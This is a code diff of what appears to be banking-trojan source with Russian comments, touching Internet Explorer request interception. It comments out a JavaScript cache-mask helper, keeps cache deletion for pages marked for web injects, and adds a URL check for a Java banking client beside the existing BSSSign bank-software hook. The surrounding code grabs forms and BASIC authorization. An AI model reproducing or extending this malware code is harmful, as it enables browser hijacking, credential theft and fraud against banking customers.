@@ -304,61 +304,64 @@ void WINAPI FORMGrabber(PRequest Request) {
 }
 // ---------------------------------------------------------------------------
 
-void AddCacheFileNameMask(PCHAR URL, PCHAR ContentType) {
-	// Функция генерирует ожидаемую маску файла кеша
-	bool CheckExtension = false;
+//void AddCacheFileNameMask(PCHAR URL, PCHAR ContentType) {
+//	// Функция генерирует ожидаемую маску файла кеша
+//	bool CheckExtension = false;
+//
+//	if (ContentType != NULL)
+//	{
+//		DWORD Hashes[] = {
+//			0x703975CC /* text/javascript */ ,
+//			0x1E3AEADB /* application/x-javascript */ ,
+//			0x26A6F9D7 /* application/javascript */ , 0
+//		};
+//
+//		DWORD Len = 0;
+//		PCHAR End = STR::Scan(ContentType, ';');
+//		if (End != NULL)
+//			Len = End - ContentType;
+//
+//		// Проверяем нужно ли нам обрабатывать документ
+//		DWORD Hash = STR::GetHash(ContentType, Len, true);
+//		bool Support = false;
+//		for (int i = 0; Hashes[i] != 0; i++) {
+//			if (Hash == Hashes[i]) {
+//				Support = true;
+//				break;
+//			}
+//
+//		}
+//
+//		if (!Support)
+//			return;
+//	}
+//	else
+//		CheckExtension = true;
+//
+//	// Определяем маску файла
+//
+//	PCHAR FileName = File::ExtractFileNameA(URL, true);
+//	PCHAR ExtPos = STR::Scan(FileName, '.');
+//	if (ExtPos != NULL) {
+//		if (CheckExtension) {
+//			DWORD ExtHash = STR::GetHash(ExtPos, 0, true);
+//			if (ExtHash != 0xBB573 /* .js */ ) {
+//				STR::Free(FileName);
+//				return;
+//			}
+//		}
+//		*ExtPos = 0;
+//	}
+//
+//	PCHAR FN = STR::New(2, FileName, "*.js");
+//
+////	IECache::AddMask(FN);
+//
+//	STR::Free(FN);
+//	STR::Free(FileName);
+//
+//}
 
-	if (ContentType != NULL) {
-		DWORD Hashes[] = {
-			0x703975CC /* text/javascript */ ,
-			0x1E3AEADB /* application/x-javascript */ , 0x26A6F9D7 /* application/javascript */ , 0
-		};
-
-		DWORD Len = 0;
-		PCHAR End = STR::Scan(ContentType, ';');
-		if (End != NULL)
-			Len = End - ContentType;
-
-		// Проверяем нужно ли нам обрабатывать документ
-		DWORD Hash = STR::GetHash(ContentType, Len, true);
-		bool Support = false;
-		for (int i = 0; Hashes[i] != 0; i++) {
-			if (Hash == Hashes[i]) {
-				Support = true;
-				break;
-			}
-
-		}
-
-		if (!Support)
-			return;
-	}
-	else
-		CheckExtension = true;
-
-	// Определяем маску файла
-
-	PCHAR FileName = File::ExtractFileNameA(URL, true);
-	PCHAR ExtPos = STR::Scan(FileName, '.');
-	if (ExtPos != NULL) {
-		if (CheckExtension) {
-			DWORD ExtHash = STR::GetHash(ExtPos, 0, true);
-			if (ExtHash != 0xBB573 /* .js */ ) {
-				STR::Free(FileName);
-				return;
-			}
-		}
-		*ExtPos = 0;
-	}
-
-	PCHAR FN = STR::New(2, FileName, "*.js");
-
-//	IECache::AddMask(FN);
-
-	STR::Free(FN);
-	STR::Free(FileName);
-
-}
 // ---------------------------------------------------------------------------
 
 PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
@@ -384,14 +387,19 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	if (Request == NULL)
 		return NULL;
 
-	Request->URL = GetInetOption(Handle, INTERNET_OPTION_URL); ;
+	Request->URL = GetInetOption(Handle, INTERNET_OPTION_URL);
 	Request->Method = MID;
+
 
 	IEDBG(Request, NULL, "Перехватываем запрос на %s", Request->URL);
 
 
-    #ifdef bsssignH
+	#ifdef bsssignH
 		BSSSign::CheckRequest(Request->URL);
+	#endif
+
+	#ifdef JavaClient2015SaverH
+		CheckJavaClient2015File(Request->URL);
 	#endif
 
 
@@ -412,7 +420,7 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	{
 		IEDBG(Request, NULL, "Страница содержит инжекты. %s", Request->URL);
 
-		AddCacheFileNameMask(Request->URL, NULL);
+		//AddCacheFileNameMask(Request->URL, NULL);
 
 		pDeleteUrlCacheEntry(Request->URL);
 
@@ -840,7 +848,8 @@ int InjectReadFile(PRequest Request, LPVOID lpBuffer,
 	return r;
 }
 
-void HandleFirstRead(PRequest Request) {
+void HandleFirstRead(PRequest Request)
+{
 	// проверяем параметры BASIC авторизации
 	CheckBASICAuthorization(Request);
 
@@ -865,10 +874,12 @@ void HandleFirstRead(PRequest Request) {
 	PCHAR ContentType = GetHTTPInfo((HINTERNET)Request->Owner,
 		HTTP_QUERY_CONTENT_TYPE);
 	bool Support = HTMLInjects::SupportContentType(ContentType);
-	if (Support) {
-		AddCacheFileNameMask(Request->URL, ContentType);
+	if (Support)
+	{
+		//AddCacheFileNameMask(Request->URL, ContentType);
 	}
-	else {
+	else
+	{
 		Request->IsInject = false;
 		IEDBG(Request, NULL, "Контент %s не поддерживается!", ContentType);
 	}
